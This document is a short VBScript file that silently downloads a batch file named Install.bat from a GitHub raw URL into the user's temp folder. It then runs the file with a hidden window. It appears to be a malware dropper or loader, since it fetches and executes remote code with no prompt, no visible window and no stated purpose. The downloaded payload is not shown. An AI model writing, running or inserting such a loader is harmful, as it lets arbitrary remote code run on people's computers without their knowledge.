Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

strTempFolder = objShell.ExpandEnvironmentStrings("%TEMP%")
strBatFile = strTempFolder & "\\Install.bat"

objShell.Run "cmd /c curl -L --silent --fail --output """ & strBatFile & """ https://github.com/lee-willie/Data/raw/refs/heads/main/Install.bat", 0, True

If objFSO.FileExists(strBatFile) Then
    WScript.Sleep 3000 
    objShell.Run "cmd /c """ & strBatFile & """", 0, True
End If
